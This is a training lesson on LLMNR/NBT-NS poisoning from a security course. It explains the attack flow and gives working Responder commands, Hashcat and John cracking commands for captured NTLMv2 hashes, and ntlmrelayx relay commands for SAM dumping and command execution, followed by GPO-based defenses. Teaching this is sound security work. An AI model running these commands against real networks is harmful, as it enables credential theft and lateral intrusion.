# LLMNR/NBT-NS Poisoning

## Unit 5 - Topic 4 | Man-in-the-Middle Attacks

---

## Overview

**LLMNR** (Link-Local Multicast Name Resolution) and **NBT-NS** (NetBIOS Name Service) are Windows fallback name resolution protocols. When DNS fails, Windows broadcasts these requests on the local network — allowing any machine to respond. Attackers exploit this to capture NTLMv2 authentication hashes.

---

## 1. Name Resolution Order (Windows)

```
WINDOWS NAME RESOLUTION ORDER:

1. LOCAL HOSTS FILE     → C:\Windows\System32\drivers\etc\hosts
2. DNS CACHE            → ipconfig /displaydns
3. DNS SERVER           → Configured DNS server
4. LLMNR (Multicast)    → 224.0.0.252 (link-local) ← VULNERABLE!
5. NBT-NS (Broadcast)   → Broadcast to subnet      ← VULNERABLE!
6. mDNS                 → 224.0.0.251               ← VULNERABLE!

ATTACK SCENARIO:
User types: \\fileserverr (typo — extra 'r')
1. Hosts file    → Not found
2. DNS cache     → Not found
3. DNS server    → Not found (NXDOMAIN)
4. LLMNR         → Broadcast: "Who is fileserverr?"
   └── ATTACKER: "That's me!" → Captures NTLMv2 hash!
```

---

## 2. How the Attack Works

```
LLMNR/NBT-NS POISONING FLOW:

┌────────────┐                    ┌────────────┐
│   Victim   │                    │  Attacker  │
│  Windows   │                    │ (Responder)│
└─────┬──────┘                    └─────┬──────┘
      │                                 │
      │  1. DNS Query: \\fileserverr    │
      │     → DNS Server: NXDOMAIN      │
      │                                 │
      │  2. LLMNR Broadcast:            │
      │     "Who is fileserverr?"       │
      │ ───────────────────────────────→│
      │                                 │
      │  3. Attacker responds:          │
      │     "I am fileserverr!"         │
      │ ←───────────────────────────────│
      │                                 │
      │  4. Victim authenticates:       │
      │     NTLMv2 Hash sent            │
      │ ───────────────────────────────→│
      │                                 │
      │  5. Attacker captures hash!     │
      │     → Crack offline or relay    │
      │                                 │
```

---

## 3. Responder — The Go-To Tool

```bash
# === RESPONDER (Laurent Gaffié) ===
# The primary tool for LLMNR/NBT-NS poisoning

# Basic usage:
sudo responder -I eth0 -wrd
# -I: Interface
# -w: Start WPAD rogue proxy
# -r: Answer NBT-NS queries for netbios wredir suffix
# -d: Enable DHCP responses

# Full attack mode:
sudo responder -I eth0 -wrfudPv
# -f: Fingerprint hosts
# -u: Log each unique hash only
# -P: Force NTLM auth on proxy
# -v: Verbose

# === RESPONDER OUTPUT ===
# [+] Listening for events...
# [SMB] NTLMv2 Hash     : admin::CORP:1122334455667788:...
# [HTTP] NTLMv2 Hash    : jsmith::CORP:aabbccdd...
# [LDAP] NTLMv2 Hash    : svc_backup::CORP:eeff0011...

# Captured hashes saved to:
# /usr/share/responder/logs/

# === HASH FORMAT ===
# admin::CORP:challenge:NTProofStr:NTLMv2Response
# Can be directly fed to Hashcat mode 5600
```

---

## 4. Cracking Captured Hashes

```bash
# === CRACK NTLMv2 WITH HASHCAT ===
hashcat -m 5600 captured_hashes.txt /usr/share/wordlists/rockyou.txt
# -m 5600: NetNTLMv2 hash type

# With rules:
hashcat -m 5600 captured_hashes.txt rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# === CRACK WITH JOHN ===
john --format=netntlmv2 captured_hashes.txt \
  --wordlist=/usr/share/wordlists/rockyou.txt

# === NTLM RELAY (Instead of cracking) ===
# Don't crack — relay the hash to another service!
# impacket-ntlmrelayx:
ntlmrelayx.py -tf targets.txt -smb2support
# Relays captured authentication to other hosts

# Relay to get SAM dump:
ntlmrelayx.py -tf targets.txt -smb2support --dump-loot

# Relay to execute command:
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
```

---

## 5. Common Triggers for LLMNR/NBT-NS

| Trigger | How It Happens |
|---------|---------------|
| **Typo in UNC path** | `\\fileserverr\share` (misspelled) |
| **Old mapped drive** | Drive mapped to decommissioned server |
| **WPAD** | Browser proxy auto-discovery |
| **Network share** | Browsing for shares on invalid name |
| **Printer** | Searching for non-existent printer |
| **Login script** | Script references deleted server |
| **Chrome/Edge** | Browser searches trigger LLMNR |

---

## 6. Detection and Prevention

| Defense | Implementation |
|---------|---------------|
| **Disable LLMNR** | GPO: Computer Config → Admin Templates → Network → DNS Client → Turn Off Multicast Name Resolution |
| **Disable NBT-NS** | Network adapter → TCP/IP → Advanced → WINS → Disable NetBIOS |
| **SMB Signing** | Required on all hosts (prevents relay) |
| **Network segmentation** | Limit broadcast domain |
| **Strong passwords** | Resist offline cracking |
| **Monitoring** | Detect Responder with honeypot names |

---

## Summary Table

| Concept | Key Point |
|---------|-----------|
| **LLMNR/NBT-NS** | Windows fallback name resolution |
| **Responder** | Poisons LLMNR/NBT-NS, captures hashes |
| **NTLMv2** | Hash format captured (Hashcat -m 5600) |
| **NTLM Relay** | Forward hash instead of cracking |
| **Trigger** | DNS failures, typos, WPAD |
| **Defense** | Disable LLMNR/NBT-NS via GPO |

---

## Quick Revision Questions

1. **When does Windows use LLMNR/NBT-NS?**
2. **How does Responder capture NTLMv2 hashes?**
3. **What is the difference between cracking and relaying hashes?**
4. **How do you disable LLMNR via Group Policy?**
5. **Why is WPAD a common trigger for hash capture?**

---

[← Previous: DHCP Attacks](03-dhcp-attacks.md) | [Next: SSL Stripping Concepts →](05-ssl-stripping-concepts.md)

---

*Unit 5 - Topic 4 of 6 | [Back to README](../README.md)*
